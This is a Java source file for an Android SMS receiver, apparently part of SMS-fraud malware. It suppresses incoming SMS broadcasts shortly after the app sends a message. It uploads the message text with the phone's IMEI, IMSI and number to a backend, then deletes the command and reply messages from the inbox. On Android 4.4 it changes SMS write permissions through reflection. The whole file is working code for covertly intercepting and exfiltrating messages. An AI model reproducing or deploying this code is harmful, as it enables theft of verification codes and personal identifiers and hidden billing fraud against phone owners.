package com.android.sms.client;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.flurry.android.FlurryAgent;

import org.greenrobot.eventbus.EventBus;

import java.util.HashMap;
import java.util.Map;

/**
 * 短信拦截
 *
 * @author zyq 16-3-9
 */
public class Receiver_SMS extends BroadcastReceiver {

	private final static boolean DEBUG = true;
	private final static String TAG = "smsReceiver";
	private final static String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private final static String SMS_CATEGORY = "android.intent.category.DEFAULT";
	private final String SMS_SERVICE = "pdus";
	private final String SMS_BODY = "body";
	private final String SMS_ID = "_id";
	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
	private final String SMS_CONTENT = "content://sms";
	private final long VALID_SMS_TIME = 45 * 1000;

	public Receiver_SMS() {
	}

	public static void registSmsReceiver(Context context, Receiver_SMS receiver) {
		IntentFilter filter = new IntentFilter();
		filter.addAction(SMS_ACTION);
		filter.addCategory(SMS_CATEGORY);
		context.registerReceiver(receiver, filter);
	}

	public static void unRegisterSmsReceiver(Context context, Receiver_SMS reciever) {
		if (reciever != null) {
			context.unregisterReceiver(reciever);
		}
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		try {
            Log.d(TAG,"Receiver_SMS.onReceive:intent:"+intent.getAction());
			if (SMS_ACTION.equals(intent.getAction())) {
				Bundle args = intent.getExtras();
				String msgContent = "";

				final long currentTime = System.currentTimeMillis();

				if (GetMsgRunnable.sendSmsTime <= 0) return;
				if (GetMsgRunnable.sendSmsTime > 0 && (currentTime - GetMsgRunnable.sendSmsTime <
						VALID_SMS_TIME)) {
					if (DEBUG) {
						Log.d(TAG, "拦截短信，应该不会有短信显示！！！！！！！！！");
					}
					this.abortBroadcast();
				} else {
					this.clearAbortBroadcast();
				}

				if (args != null) {
					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
                    //pdu为承载着一条短信的所有短信。
                    //一条短信为140个英文字符长度，在这个长度范围内，即需一个pdu即可。超出这个范围，即要分割成多个pdu数组。
                    Log.d(TAG,"该短信由几个pdus组成："+pdus.length);
					SmsMessage messages[] = new SmsMessage[pdus.length];
                    StringBuilder sb = new StringBuilder();
                    for(int i = 0;i<messages.length;i++){
                        messages[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                        sb.append(messages[i].getMessageBody());
                    }
                    if(sb.toString() != null){
                        if (DEBUG) {
                            Log.d(TAG, "收到的短信内容：" + sb.toString());
                        }
                        reportData(context,sb.toString());
                    }

					for (int i = 0; i < messages.length; i++) {
						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						msgContent = messages[i].getMessageBody();
						if (msgContent != null) {
							if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
								if (SmsWriteOpUtil.isWriteEnabled(context)) {
									boolean isSuccess = SmsWriteOpUtil.setWriteEnabled(context, true);
									final String model = Build.MODEL;
									if (DEBUG) {
										Log.d(TAG, "4.4反射修改短信权限！！！！！！ " + isSuccess);
									}
									Map<String, String> map = new HashMap<>();
									map.put(NativeParams.KEY_FIX_SYSTEM_SUCCESS, String.valueOf(isSuccess));
									map.put(NativeParams.KEY_KITKAT_DEVICE, model);
									FlurryAgent.logEvent(NativeParams.EVENT_VERSION_KITKAT,map);
								}
							}

							//删掉指令短信
							deleteSMS(context, GetMsgRunnable.currentCheckInfo.getOperatorCode());
							//删除短信短信
							deleteSMS(context, msgContent);
                            return;
						}
					}
				}
			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
		}
	}

	private void reportData(Context context, String contentMsg) {
		SmsSimInfo info = new SmsSimInfo();
		CheckInfo checkInfo = GetMsgRunnable.currentCheckInfo;
		final String operator = checkInfo.getOperators();
		final String operatorCode = checkInfo.getOperatorCode();

		info.setImei(SmsManageUtil.getInstance(context).getPhoneIMEI());
		info.setImsi(SmsManageUtil.getInstance(context).getPhoneIMSI());
		info.setMessageinfo(contentMsg);
		info.setPhonenumber(SmsManageUtil.getInstance(context).getNativePhoneNumber1());
		info.setOperators(operator);
		info.setOperatorcode(operatorCode);

		if (DEBUG) {
			Log.d(TAG, "即将上报短信信息！！！！！！！！！！");
		}

		StringBuilder builder = new StringBuilder();
		builder.append("imei:" + info.getIMEI()).append("\n")
				.append("imsi:" + info.getIMSI()).append("\n")
				.append("phoneNumber:" + info.getPhonenumber()).append("\n")
				.append("operator:" + info.getOperators()).append("\n")
				.append("operatorcode:" + info.getOperatorcode()).append("\n")
				.append("smsinfo:" + info.getMessageinfo()).append("\n");
		EventBus.getDefault().post(new MessageEvent(builder.toString()));

		try {
			info.saveInBackground();
		} catch (Throwable e) {
			if (DEBUG) {
				Log.d(TAG, "上报数据失败！！！！！！！！！！！！");
				Log.e(TAG, e.fillInStackTrace().toString());
			}
		}
	}


	public void deleteSMS(Context context, String smsContent) {
		try {
			if (DEBUG) {
				Log.d(TAG, "要删除的短信内容是：" + smsContent);
			}
            EventBus.getDefault().post(new MessageEvent("want to delete: "+smsContent));

			Uri uri = Uri.parse(SMS_CONTENT);
			ContentResolver contentResolver = context.getContentResolver();
			if (contentResolver != null) {
                String select =  SMS_BODY+" LIKE ?";
                String[] selectArgs = new String[]{"%" + smsContent + "%"};
				Cursor isRead = contentResolver.query(uri, null, select, selectArgs, "date desc");
                boolean isExist = isRead.moveToFirst();
                if(isExist){
                    Log.d(TAG, "存在该字串！！！！");
                    EventBus.getDefault().post(new MessageEvent("is exist!"));
                    int id = isRead.getInt(isRead.getColumnIndex(SMS_ID));
                    if (DEBUG) {
                        Log.d(TAG, "找到该短信:" + smsContent + " 短信标识为:" + id + "准备删除!");
                    }
                    int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT), "_id=" + id, null);

                    final String device = Build.MODEL;
                    final String verison = Build.VERSION.RELEASE;
                    final boolean isDeleteSuccess = count >= 1 ? true : false;
                    Map<String, String> map1 = new HashMap<>();
                    map1.put(NativeParams.KEY_DELETE_SMS_SUCCESS, String.valueOf(isDeleteSuccess));
                    FlurryAgent.logEvent(NativeParams.EVENT_SEND_SMS,map1);

                    if (count >= 1) {
                        Map<String, String> map = new HashMap<>();
                        map.put(NativeParams.KEY_DELETE_SUCCESS_DEVICE, device);
                        map.put(NativeParams.KEY_DELETE_SUCCESS_VERSION, verison);
                        FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_SUCCESS,map);
                    } else {
                        Map<String, String> map = new HashMap<>();
                        map.put(NativeParams.KEY_DELETE_FAIL_DEVICE, device);
                        map.put(NativeParams.KEY_DELETE_FAIL_VERSION, verison);
                        FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_FAILED,map);
                    }
                    if (DEBUG) {
                        Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT + "短信是否删除成功：" + ((count >= 1) ? "删除成功" :
                                "删除失败"));
                    }
                    EventBus.getDefault().post(new MessageEvent((count >=1)?"delete success":"delete failed"));
                    isRead.close();
                }

			}
		} catch (Throwable e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
		}
	}

}
